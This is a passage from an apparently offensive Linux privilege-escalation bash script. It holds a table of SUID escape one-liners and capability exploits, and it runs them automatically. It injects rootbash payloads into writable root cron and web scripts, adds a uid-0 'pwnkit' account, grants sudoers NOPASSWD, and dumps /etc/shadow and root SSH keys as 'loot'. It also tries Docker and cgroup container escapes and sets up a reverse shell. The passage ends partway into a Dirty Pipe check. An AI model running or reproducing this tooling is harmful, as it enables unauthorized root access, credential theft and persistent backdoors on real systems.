  GTFO_SUID[diff]="diff --line-format=%L /dev/null /etc/shadow"
  GTFO_SUID[docker]="docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
  GTFO_SUID[ed]="ed /etc/shadow"
  GTFO_SUID[emacs]="emacs -Q -nw --eval '(term \"/bin/bash -p\")'"
  GTFO_SUID[env]="env /bin/bash -p"
  GTFO_SUID[expand]="expand /etc/shadow"
  GTFO_SUID[expect]="expect -c 'spawn /bin/bash -p;interact'"
  GTFO_SUID[file]="file -f /etc/shadow"
  GTFO_SUID[find]="find . -exec /bin/bash -p \\; -quit"
  GTFO_SUID[flock]="flock -u / /bin/bash -p"
  GTFO_SUID[fmt]="fmt -w99999 /etc/shadow"
  GTFO_SUID[fold]="fold -w99999 /etc/shadow"
  GTFO_SUID[gawk]="gawk 'BEGIN {system(\"/bin/bash -p\")}'"
  GTFO_SUID[gdb]="gdb -nx -ex 'python import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")' -ex quit"
  GTFO_SUID[gimp]="gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
  GTFO_SUID[grep]="grep '' /etc/shadow"
  GTFO_SUID[head]="head -c1G /etc/shadow"
  GTFO_SUID[hexdump]="hexdump -C /etc/shadow"
  GTFO_SUID[highlight]="highlight --no-doc --failsafe /etc/shadow"
  GTFO_SUID[iconv]="iconv -f 8859_1 -t 8859_1 /etc/shadow"
  GTFO_SUID[ip]="ip netns add foo; ip netns exec foo /bin/bash -p; ip netns delete foo"
  GTFO_SUID[jq]="jq -Rr . /etc/shadow"
  GTFO_SUID[ksh]="ksh -p"
  GTFO_SUID[ld.so]="/lib/ld.so /bin/bash -p"
  GTFO_SUID[less]="less /etc/shadow"
  GTFO_SUID[logsave]="logsave /dev/null /bin/bash -p"
  GTFO_SUID[look]="look '' /etc/shadow"
  GTFO_SUID[lua]="lua -e 'os.execute(\"/bin/bash -p\")'"
  GTFO_SUID[make]="COMMAND='/bin/bash -p'; make -s --eval=\"\\\$(\\$COMMAND)\" ."
  GTFO_SUID[mawk]="mawk 'BEGIN {system(\"/bin/bash -p\")}'"
  GTFO_SUID[more]="more /etc/shadow"
  GTFO_SUID[mv]="mv /bin/bash /tmp/bk; cp /bin/bash /tmp/rootbash"
  GTFO_SUID[nano]="nano /etc/shadow"
  GTFO_SUID[nawk]="nawk 'BEGIN {system(\"/bin/bash -p\")}'"
  GTFO_SUID[nice]="nice /bin/bash -p"
  GTFO_SUID[nl]="nl -bn -w1 -s '' /etc/shadow"
  GTFO_SUID[nmap]="nmap --interactive"
  GTFO_SUID[node]="node -e 'require(\"child_process\").spawn(\"/bin/bash\",[\"-p\"],{stdio:[0,1,2]})'"
  GTFO_SUID[nohup]="nohup /bin/bash -p -c 'id && bash -p' 2>/dev/null"
  GTFO_SUID[od]="od -An -c -w9999 /etc/shadow"
  GTFO_SUID[openssl]="openssl enc -in /etc/shadow"
  GTFO_SUID[perl]="perl -e 'exec \"/bin/bash -p\";'"
  GTFO_SUID[pg]="pg /etc/shadow"
  GTFO_SUID[php]="php -r 'pcntl_exec(\"/bin/bash\",[\"-p\"]);'"
  GTFO_SUID[pico]="pico /etc/shadow"
  GTFO_SUID[python]="python -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
  GTFO_SUID[python3]="python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
  GTFO_SUID[readelf]="readelf -a @/etc/shadow"
  GTFO_SUID[rlwrap]="rlwrap /bin/bash -p"
  GTFO_SUID[rpm]="rpm --eval '%{lua:os.execute(\"/bin/bash -p\")}'"
  GTFO_SUID[rsync]="rsync -e 'bash -p -c \"bash -p 0<&2 1>&2\"' 127.0.0.1:/dev/null"
  GTFO_SUID[ruby]="ruby -e 'exec \"/bin/bash -p\"'"
  GTFO_SUID[run-parts]="run-parts --new-session --regex '^bash$' /bin --arg '-p'"
  GTFO_SUID[rvim]="rvim -c ':py import os; os.execl(\"/bin/bash\",\"bash\",\"-p\")'"
  GTFO_SUID[screen]="screen -x"
  GTFO_SUID[script]="script -q /dev/null -c 'bash -p'"
  GTFO_SUID[sed]="sed -n '1e exec bash -p 1>&0' /etc/hosts"
  GTFO_SUID[setarch]="setarch \$(arch) /bin/bash -p"
  GTFO_SUID[shuf]="shuf -e DATA -o /etc/shadow"
  GTFO_SUID[sort]="sort -m /etc/shadow /dev/stdin"
  GTFO_SUID[socat]="socat stdin exec:/bin/bash,pty,stderr,setsid"
  GTFO_SUID[stdbuf]="stdbuf -i0 /bin/bash -p"
  GTFO_SUID[strace]="strace -o /dev/null /bin/bash -p"
  GTFO_SUID[strings]="strings /etc/shadow"
  GTFO_SUID[systemctl]="TF=\$(mktemp).service; echo '[Service]' > \$TF; echo 'Type=oneshot' >> \$TF; echo 'ExecStart=/bin/bash -c \"bash -p > /dev/tcp/127.0.0.1/1337 0<&1 2>&1\"' >> \$TF; echo '[Install]' >> \$TF; echo 'WantedBy=multi-user.target' >> \$TF; systemctl link \$TF; systemctl enable --now \$(basename \$TF)"
  GTFO_SUID[tail]="tail -c1G /etc/shadow"
  GTFO_SUID[tar]="tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/bash -p'"
  GTFO_SUID[taskset]="taskset 1 /bin/bash -p"
  GTFO_SUID[tee]="echo DATA | tee /etc/shadow"
  GTFO_SUID[time]="/usr/bin/time /bin/bash -p"
  GTFO_SUID[timeout]="timeout 9999 /bin/bash -p"
  GTFO_SUID[ul]="ul /etc/shadow"
  GTFO_SUID[unexpand]="unexpand -t99999 /etc/shadow"
  GTFO_SUID[uniq]="uniq /etc/shadow"
  GTFO_SUID[unshare]="unshare /bin/bash -p"
  GTFO_SUID[vi]="vi -c ':!bash -p'"
  GTFO_SUID[vim]="vim -c ':!bash -p'"
  GTFO_SUID[watch]="watch -x /bin/bash -p -c 'reset; exec bash -p </dev/tty >/dev/tty 2>&1'"
  GTFO_SUID[wc]="wc --files0-from /etc/shadow"
  GTFO_SUID[wget]="TF=\$(mktemp); chmod +x \$TF; echo '/bin/bash -p' > \$TF; wget --use-askpass=\$TF 0"
  GTFO_SUID[xargs]="xargs -a /dev/null /bin/bash -p"
  GTFO_SUID[xxd]="xxd /etc/shadow | xxd -r"
  GTFO_SUID[zip]="TF=\$(mktemp -u); zip \$TF /etc/hosts -T -TT '/bin/bash -p #'"
  GTFO_SUID[zsh]="zsh"
  
  local unusual_count=0
  
  echo "$SUID_BINS" | while IFS= read -r bin; do
    local binname=$(basename "$bin")
    local safe=false
    
    for s in $SAFE_SUID; do
      if [ "$bin" = "$s" ] || echo "$bin" | grep -q "^${s}"; then
        safe=true
        break
      fi
    done
    
    if [ "$safe" = false ]; then
      unusual_count=$((unusual_count + 1))
      
      if [ -n "${GTFO_SUID[$binname]+x}" ]; then
        found_vector "SUID GTFOBins: $bin ($binname)"
        success "Exploit: ${GTFO_SUID[$binname]}"
        
        if [ "$AUTO_EXPLOIT" = true ] && [ "$SCAN_ONLY" != true ]; then
          info "Attempting SUID exploitation via $binname..."
          eval "${GTFO_SUID[$binname]}" 2>/dev/null
          check_root_shell && return
        fi
      else
        warning "Unusual SUID binary: $bin"
        ls -la "$bin" 2>/dev/null
        file "$bin" 2>/dev/null | grep -v "^$"
      fi
    fi
  done
  
  # Check SGID
  subheader "Finding SGID binaries"
  SGID_BINS=$(timeout 10 find / -perm -2000 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" 2>/dev/null | head -30)
  if [ -n "$SGID_BINS" ]; then
    echo "$SGID_BINS" | while IFS= read -r bin; do
      info "SGID: $bin"
    done
  fi
}

check_suid_fallback() {
  local suid_bins="$1"
  
  local exploitable="env find awk gawk perl python python3 ruby lua vi vim nmap less more \
    ftp socat zip tar cp nano ed sed git ssh node docker strace bash ash csh dash ksh zsh \
    php script screen tmux expect nice ionice timeout stdbuf xargs taskset flock gcc gdb \
    busybox rsync openssl base64 xxd dd systemctl wget curl make"
  
  echo "$suid_bins" | while IFS= read -r bin; do
    local binname=$(basename "$bin")
    for e in $exploitable; do
      if [ "$binname" = "$e" ]; then
        found_vector "SUID exploitable binary: $bin"
        break
      fi
    done
  done
}

# ============================================================================
# 3. CAPABILITIES CHECK
# ============================================================================
check_capabilities() {
  header "LINUX CAPABILITIES"
  
  if ! command_exists getcap; then
    info "getcap not found, skipping capabilities check"
    return
  fi
  
  CAPS=$(getcap -r / 2>/dev/null | grep -v "Operation not permitted")
  
  if [ -z "$CAPS" ]; then
    info "No special capabilities found"
    return
  fi
  
  echo "$CAPS" | while IFS= read -r line; do
    local bin=$(echo "$line" | awk '{print $1}')
    local cap=$(echo "$line" | awk '{print $NF}')
    local binname=$(basename "$bin")
    
    info "Capability: ${W}$bin${RST} -> ${Y}$cap${RST}"
    
    # Check for dangerous capabilities
    case "$cap" in
      *cap_setuid*|*cap_setgid*)
        found_vector "Capability $cap on $bin"
        
        case "$binname" in
          python*|python3*)
            success "Exploit: $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -c 'import os; os.setuid(0); os.system("/bin/bash")' 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          perl*)
            success "Exploit: $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";' 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          ruby*)
            success "Exploit: $bin -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -e 'Process::Sys.setuid(0); exec "/bin/bash"' 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          node*)
            success "Exploit: $bin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})' 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          php*)
            success "Exploit: $bin -r 'posix_setuid(0); system(\"/bin/bash\");'"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -r 'posix_setuid(0); system("/bin/bash");' 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          gdb*)
            success "Exploit: $bin -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid $binname"
              $bin -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit 2>/dev/null
              if check_root_shell; then exploit_success "cap_setuid $binname"; else exploit_failed "cap_setuid $binname"; fi
            fi
            ;;
          newuidmap)
            info "newuidmap has cap_setuid - attempting user namespace exploitation"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setuid newuidmap -> user namespace root"
              if command_exists unshare; then
                local ns_result
                ns_result=$(timeout 5 unshare -U -r bash -c 'echo "NS_OK:$(id)"' 2>/dev/null)
                if echo "$ns_result" | grep -q "NS_OK.*uid=0"; then
                  success "User namespace created with root mapping"
                  info "Checking if we can escalate from namespace..."
                  timeout 5 unshare -U -r bash -c 'cat /etc/shadow' > "$TMPDIR/.shadow_dump" 2>/dev/null
                  if [ -s "$TMPDIR/.shadow_dump" ]; then
                    exploit_success "User namespace -> read /etc/shadow"
                    success "Shadow file dumped to memory, extracting hashes..."
                    cat "$TMPDIR/.shadow_dump" | grep -v ':\*:\|:!:\|::' | head -5
                    rm -f "$TMPDIR/.shadow_dump" 2>/dev/null
                  fi
                  timeout 5 unshare -U -r bash -c 'cp /bin/bash /tmp/rootbash 2>/dev/null && chmod u+s /tmp/rootbash 2>/dev/null' 2>/dev/null
                  if verify_suid_root /tmp/rootbash; then
                    exploit_success "cap_setuid newuidmap -> SUID bash via namespace"
                    /tmp/rootbash -p 2>/dev/null
                    check_root_shell && return
                  fi
                  timeout 5 unshare -U -r bash -c '
                    if [ -w /etc/passwd ]; then
                      PH=$(openssl passwd -1 -salt bump pwnkit 2>/dev/null || echo "$1$bump$RVTkPvPYsb4TtLU0UxD2E.")
                      echo "pwnkit:${PH}:0:0:pwnkit:/root:/bin/bash" >> /etc/passwd
                    fi
                  ' 2>/dev/null
                  timeout 10 unshare -U -r bash -c '
                    for f in /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/id_ecdsa; do
                      if [ -r "$f" ]; then echo "=== $f ==="; cat "$f"; fi
                    done
                    cat /etc/shadow 2>/dev/null
                    cat /root/.bash_history 2>/dev/null | tail -30
                  ' > "$TMPDIR/.ns_loot" 2>/dev/null
                  if [ -s "$TMPDIR/.ns_loot" ]; then
                    success "Namespace loot collected:"
                    head -20 "$TMPDIR/.ns_loot"
                  fi
                fi
              fi
              if command_exists nsenter; then
                local pid1_ns
                pid1_ns=$(timeout 3 nsenter -t 1 -U -r id 2>/dev/null)
                if echo "$pid1_ns" | grep -q "uid=0"; then
                  exploit_success "nsenter into PID 1 namespace as root"
                  nsenter -t 1 -U -r /bin/bash 2>/dev/null
                  check_root_shell && return
                fi
              fi
              exploit_failed "cap_setuid newuidmap (namespace limited)"
            fi
            ;;
          newgidmap)
            info "newgidmap has cap_setgid - attempting group namespace exploitation"
            if [ "$AUTO_EXPLOIT" = true ]; then
              exploit_attempt "cap_setgid newgidmap -> group namespace"
              if command_exists unshare; then
                timeout 5 unshare -U -r bash -c '
                  for f in /etc/shadow /etc/gshadow; do
                    if [ -r "$f" ]; then echo "=== $f ==="; cat "$f"; fi
                  done
                ' > "$TMPDIR/.gns_loot" 2>/dev/null
                if [ -s "$TMPDIR/.gns_loot" ]; then
                  exploit_success "cap_setgid -> read protected files via namespace"
                  head -10 "$TMPDIR/.gns_loot"
                else
                  exploit_failed "cap_setgid newgidmap"
                fi
              fi
            fi
            ;;
        esac
        ;;
      *cap_dac_read_search*|*cap_dac_override*)
        found_vector "Capability $cap on $bin (can read/write any file)"
        ;;
      *cap_sys_admin*)
        found_vector "Capability $cap on $bin (sysadmin)"
        ;;
      *cap_sys_ptrace*)
        found_vector "Capability $cap on $bin (can ptrace processes)"
        ;;
      *cap_net_raw*)
        warning "Capability $cap on $bin (can sniff traffic)"
        ;;
      *cap_net_bind_service*)
        info "Capability $cap on $bin (can bind low ports)"
        ;;
    esac
    
    check_root_shell && return
  done
}

# ============================================================================
# 4. CRON JOBS
# ============================================================================
check_cron() {
  header "CRON JOBS & SCHEDULED TASKS"
  
  subheader "System crontab"
  if [ -r /etc/crontab ]; then
    cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" | while IFS= read -r line; do
      info "$line"
      
      if echo "$line" | grep -qE 'https?://' && echo "$line" | grep -qiE '(secure_key|token|api_key|secret|password|passwd)='; then
        warning "Exposed secret/token in cron URL: $(echo "$line" | grep -oE 'https?://[^ "]*' | head -1)"
      fi
      
      if echo "$line" | grep -qE 'base64|b64|decode'; then
        warning "SUSPICIOUS: Base64-encoded command in system crontab"
        local decoded=$(echo "$line" | grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d 2>/dev/null)
        if [ -n "$decoded" ]; then
          critical "Decoded payload: $decoded"
          found_vector "Obfuscated system crontab command (possible backdoor)"
        fi
      fi
      
      # Extract the command
      local cmd=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf $i" "; print ""}')
      # Check if the script is writable
      local script_path=$(echo "$cmd" | awk '{print $1}')
      if [ -n "$script_path" ] && [ -f "$script_path" ] && [ -w "$script_path" ]; then
        found_vector "Writable cron script: $script_path"
        if [ "$AUTO_EXPLOIT" = true ]; then
          info "Injecting reverse shell into $script_path"
          echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> "$script_path"
          success "Payload injected. Wait for cron to execute, then run: /tmp/rootbash -p"
        fi
      fi
    done
  fi
  
  subheader "Cron directories"
  for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$crondir" ]; then
      for f in "$crondir"/*; do
        [ -f "$f" ] || continue
        info "Cron file: $f"
        if [ -w "$f" ]; then
          found_vector "Writable cron file: $f"
        fi
      done
    fi
  done
  
  subheader "User crontabs"
  ls -la /var/spool/cron/crontabs/ 2>/dev/null
  ls -la /var/spool/cron/ 2>/dev/null
  
  crontab -l 2>/dev/null | while IFS= read -r line; do
    if echo "$line" | grep -qE 'base64|b64|decode'; then
      warning "SUSPICIOUS: Base64-encoded command in crontab:"
      warning "  $line"
      local decoded=$(echo "$line" | grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d 2>/dev/null)
      if [ -n "$decoded" ]; then
        critical "Decoded payload: $decoded"
        found_vector "Obfuscated crontab command (possible backdoor/miner)"
      fi
    fi
  done

  if [ "$VERBOSE" = true ]; then
    verbose "Current user crontab:"
    crontab -l 2>/dev/null | while IFS= read -r line; do
      verbose "  $line"
    done
    verbose "All readable crontab files:"
    for user_cron in /var/spool/cron/crontabs/* /var/spool/cron/*; do
      if [ -r "$user_cron" ] 2>/dev/null; then
        verbose "  $user_cron ($(stat -c '%U' "$user_cron" 2>/dev/null))"
        cat "$user_cron" 2>/dev/null | grep -v "^#" | grep -v "^$" | while IFS= read -r l; do
          verbose "    $l"
        done
      fi
    done
    verbose "Anacron jobs:"
    cat /etc/anacrontab 2>/dev/null | grep -v "^#" | grep -v "^$" | while IFS= read -r l; do
      verbose "  $l"
    done
  fi
  
  # Check for writable PATH directories in cron
  subheader "Cron PATH hijacking"
  if [ -r /etc/crontab ]; then
    CRON_PATH=$(grep "^PATH" /etc/crontab 2>/dev/null | cut -d= -f2)
    if [ -n "$CRON_PATH" ]; then
      info "Cron PATH: $CRON_PATH"
      echo "$CRON_PATH" | tr ':' '\n' | while IFS= read -r dir; do
        if [ -w "$dir" ]; then
          found_vector "Writable directory in cron PATH: $dir"
        fi
      done
    fi
  fi
  
  # Check for wildcard injection in cron
  subheader "Wildcard injection"
  grep -r '\*' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -v "^#" | grep -E "(tar|rsync|chown|chmod)" | while IFS= read -r line; do
    found_vector "Potential wildcard injection: $line"
  done
  
  # Writable scripts called by root cron
  subheader "Writable scripts in cron"
  local cron_scripts=""
  cron_scripts=$(grep -rhE '^\s*(\*|[0-9])' /etc/crontab /etc/cron.d/* 2>/dev/null | \
    grep -v "^#" | \
    awk '{if($6=="root" || $6=="") for(i=7;i<=NF;i++) printf $i" "; print ""}' | \
    grep -oE '/[^ ;|&>]*\.(sh|py|pl|rb|php|bash)' | sort -u)
  
  if [ -n "$cron_scripts" ]; then
    while IFS= read -r script_path; do
      [ -z "$script_path" ] && continue
      if [ -w "$script_path" ] 2>/dev/null; then
        local script_owner
        script_owner=$(stat -c '%U' "$script_path" 2>/dev/null)
        found_vector "Writable script called by root cron: $script_path (owner: $script_owner)"
        if [ "$AUTO_EXPLOIT" = true ] && [ "$SCAN_ONLY" != true ]; then
          exploit_attempt "Writable cron script: $script_path"
          echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> "$script_path"
          success "Payload injected into $script_path. Wait for cron, then: /tmp/rootbash -p"
        fi
      fi
    done <<< "$cron_scripts"
  fi
  
  # Writable web scripts that might be called by root cron/services
  subheader "Writable web scripts with root execution"
  local web_dirs="/var/www /srv/www /opt/www /var/www/vhosts"
  for wdir in $web_dirs; do
    [ -d "$wdir" ] || continue
    timeout 10 find "$wdir" -maxdepth 5 -writable \
      \( -name "*.php" -o -name "*.py" -o -name "*.sh" -o -name "*.pl" \) \
      -type f 2>/dev/null | head -30 | while IFS= read -r wf; do
      local wf_owner
      wf_owner=$(stat -c '%U' "$wf" 2>/dev/null)
      local in_cron=false
      if grep -rql "$wf" /etc/crontab /etc/cron.d/ /var/spool/cron/ 2>/dev/null; then
        in_cron=true
      fi
      if [ "$in_cron" = true ]; then
        found_vector "Writable web script called by cron: $wf"
        if [ "$AUTO_EXPLOIT" = true ] && [ "$SCAN_ONLY" != true ]; then
          exploit_attempt "Writable cron web script: $wf"
          local ext="${wf##*.}"
          case "$ext" in
            php)
              echo '<?php system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); ?>' >> "$wf"
              ;;
            py)
              echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' >> "$wf"
              ;;
            sh|bash)
              echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> "$wf"
              ;;
          esac
          success "Payload added to $wf. Wait for cron, then: /tmp/rootbash -p"
        fi
      fi
    done
  done
  
  # Systemd timers
  subheader "Systemd timers"
  systemctl list-timers --all 2>/dev/null | head -20
}

# ============================================================================
# 5. WRITABLE FILES & DIRECTORIES
# ============================================================================
check_writable() {
  header "WRITABLE FILES & DIRECTORIES"
  
  # /etc/passwd
  subheader "Critical file checks"
  if [ -w /etc/passwd ]; then
    found_vector "Writable /etc/passwd!"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "Writable /etc/passwd -> add root user"
      local hash=$(openssl passwd -1 -salt pwnkit pwnkit 2>/dev/null)
      if [ -n "$hash" ]; then
        echo "pwnkit:${hash}:0:0:root:/root:/bin/bash" >> /etc/passwd
        exploit_success "Added user pwnkit:pwnkit with uid=0"
        success "Run: su pwnkit (password: pwnkit)"
        su pwnkit -c '/bin/bash' 2>/dev/null
        check_root_shell && return
      else
        echo 'pwnkit:$1$pwnkit$KkXdO6YF3u.VtPXMXrqJO/:0:0:root:/root:/bin/bash' >> /etc/passwd
        exploit_success "Added user pwnkit (fallback hash). Run: su pwnkit"
      fi
    fi
  else
    info "/etc/passwd: not writable"
  fi
  
  if [ -w /etc/shadow ]; then
    found_vector "Writable /etc/shadow!"
  elif [ -r /etc/shadow ]; then
    found_vector "Readable /etc/shadow! Can crack password hashes"
    if [ "$AUTO_EXPLOIT" = true ]; then
      info "Shadow file contents:"
      cat /etc/shadow 2>/dev/null
    fi
  fi
  
  if [ -w /etc/sudoers ]; then
    found_vector "Writable /etc/sudoers!"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "Writable /etc/sudoers -> NOPASSWD ALL"
      echo "$SYS_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
      sudo -n /bin/bash 2>/dev/null
      if check_root_shell; then exploit_success "/etc/sudoers NOPASSWD"; return; fi
      exploit_failed "/etc/sudoers write"
    fi
  fi
  
  if [ -w /etc/sudoers.d/ ]; then
    found_vector "Writable /etc/sudoers.d/ directory!"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "Writable /etc/sudoers.d -> NOPASSWD ALL"
      echo "$SYS_USER ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/bump_lpe
      chmod 440 /etc/sudoers.d/bump_lpe
      sudo -n /bin/bash 2>/dev/null
      if check_root_shell; then exploit_success "/etc/sudoers.d NOPASSWD"; return; fi
      exploit_failed "/etc/sudoers.d write"
    fi
  fi
  
  # Check /root/.ssh/authorized_keys
  if [ -w /root/.ssh/authorized_keys ] 2>/dev/null; then
    found_vector "Writable /root/.ssh/authorized_keys"
  fi
  if [ -w /root/.ssh/ ] 2>/dev/null; then
    found_vector "Writable /root/.ssh/ directory"
  fi
  
  if [ "$VERBOSE" = true ]; then
    verbose "File permissions on critical files:"
    for f in /etc/passwd /etc/shadow /etc/sudoers /etc/group /etc/gshadow /etc/hosts /etc/hostname /etc/resolv.conf /etc/crontab; do
      if [ -e "$f" ]; then
        verbose "  $(ls -la "$f" 2>/dev/null)"
      fi
    done
    verbose "World-writable directories (excl /tmp /proc /sys /dev):"
    timeout 10 find / -writable -type d \
      -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
      -not -path "/tmp/*" -not -path "/var/tmp/*" -not -path "/run/*" \
      -not -path "/nix/*" -not -path "/snap/*" \
      2>/dev/null | head -30 | while IFS= read -r d; do
      verbose "  $d"
    done
  fi
  
  # Writable service files
  subheader "Writable service files"
  find /etc/systemd/system/ /usr/lib/systemd/system/ /lib/systemd/system/ \
    -writable -type f 2>/dev/null | while IFS= read -r f; do
    found_vector "Writable systemd service: $f"
  done
  
  # Writable init scripts
  find /etc/init.d/ -writable -type f 2>/dev/null | while IFS= read -r f; do
    found_vector "Writable init script: $f"
  done
  
  # Writable /etc/ld.so.conf.d/ or /etc/ld.so.conf
  if [ -w /etc/ld.so.conf ] || [ -w /etc/ld.so.conf.d/ ]; then
    found_vector "Writable ld.so configuration (shared library hijacking)"
  fi
  
  # Writable /etc/environment
  if [ -w /etc/environment ]; then
    found_vector "Writable /etc/environment"
  fi
  
  # Writable /etc/profile or /etc/profile.d/
  if [ -w /etc/profile ]; then
    found_vector "Writable /etc/profile"
  fi
  if [ -w /etc/profile.d/ ]; then
    found_vector "Writable /etc/profile.d/ directory"
  fi
  
  # Writable .bashrc / .profile of other users
  subheader "Writable user configs"
  for homedir in /home/* /root; do
    for rc in .bashrc .bash_profile .profile .zshrc; do
      if [ -w "$homedir/$rc" ] 2>/dev/null; then
        local owner=$(stat -c '%U' "$homedir/$rc" 2>/dev/null)
        if [ "$owner" != "$SYS_USER" ]; then
          found_vector "Writable $homedir/$rc (owned by $owner)"
        fi
      fi
    done
  done
}

# ============================================================================
# 6. DOCKER / LXC / CONTAINER CHECKS
# ============================================================================
check_docker() {
  header "DOCKER / CONTAINER CHECKS"
  
  # Check if user is in docker group
  if id -nG 2>/dev/null | grep -qw docker; then
    found_vector "User is in docker group"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "Docker group -> container breakout"
      docker run -v /:/mnt --rm -it alpine chroot /mnt bash 2>/dev/null
      if check_root_shell; then exploit_success "Docker group breakout"; return; fi
      exploit_failed "Docker group breakout"
    fi
  fi
  
  # Check writable docker socket
  if [ -w /var/run/docker.sock ]; then
    found_vector "Writable docker.sock"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "Writable docker.sock -> breakout"
      if command_exists docker; then
        docker run -v /:/mnt --rm -it alpine chroot /mnt bash 2>/dev/null
      elif command_exists curl; then
        # Use docker API directly
        local container_id=$(curl -s --unix-socket /var/run/docker.sock \
          -X POST "http://localhost/containers/create" \
          -H "Content-Type: application/json" \
          -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt bash"],"Binds":["/:/mnt"],"Privileged":true}' \
          2>/dev/null | grep -oP '"Id":"\K[^"]+')
        if [ -n "$container_id" ]; then
          curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$container_id/start" 2>/dev/null
          success "Container started, attach manually"
        fi
      fi
    fi
  fi
  
  # Check if in privileged container
  if [ -f /.dockerenv ]; then
    subheader "Docker container escape checks"
    
    # Check if privileged
    if ip link add dummy0 type dummy 2>/dev/null; then
      ip link delete dummy0 2>/dev/null
      found_vector "Running in PRIVILEGED Docker container"
      if [ "$AUTO_EXPLOIT" = true ]; then
        info "Attempting container escape via cgroup..."
        mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
        if [ -d /tmp/cgrp ]; then
          mkdir -p /tmp/cgrp/x
          echo 1 > /tmp/cgrp/x/notify_on_release
          host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
          echo "$host_path/tmp/exploit.sh" > /tmp/cgrp/release_agent
          echo '#!/bin/bash' > /tmp/exploit.sh
          echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /tmp/exploit.sh
          chmod +x /tmp/exploit.sh
          echo $$ > /tmp/cgrp/x/cgroup.procs
          sleep 1
          success "Check /tmp/rootbash on the host"
        fi
      fi
    fi
    
    # Check for mounted docker socket inside container
    if [ -S /var/run/docker.sock ]; then
      found_vector "Docker socket mounted inside container"
    fi
    
    # Check for cap_sys_admin in container
    if grep -q cap_sys_admin /proc/self/status 2>/dev/null; then
      found_vector "Container has CAP_SYS_ADMIN"
    fi
  fi
  
  # LXC checks
  if [ -n "$CONTAINER" ] && [ "$CONTAINER" = "lxc" ]; then
    subheader "LXC container escape checks"
    if [ -d /dev/lxd ] || [ -S /dev/lxd/sock ]; then
      found_vector "LXD socket available for container escape"
    fi
  fi
}

# ============================================================================
# 7. KERNEL EXPLOIT CHECKS
# ============================================================================
check_kernel_exploits() {
  header "KERNEL VULNERABILITY CHECKS"
  
  local kernel_version="$SYS_KERNEL"
  local kernel_major=$(echo "$kernel_version" | cut -d. -f1)
  local kernel_minor=$(echo "$kernel_version" | cut -d. -f2)
  local kernel_patch=$(echo "$kernel_version" | cut -d. -f3 | cut -d- -f1)
  
  info "Kernel: ${W}$kernel_version${RST}"
  info "Parsed: ${W}${kernel_major}.${kernel_minor}.${kernel_patch}${RST}"
  
  # CVE-2022-0847 (Dirty Pipe) - Linux >= 5.8 && < 5.16.11 || < 5.15.25 || < 5.10.102
  subheader "CVE-2022-0847 (Dirty Pipe)"
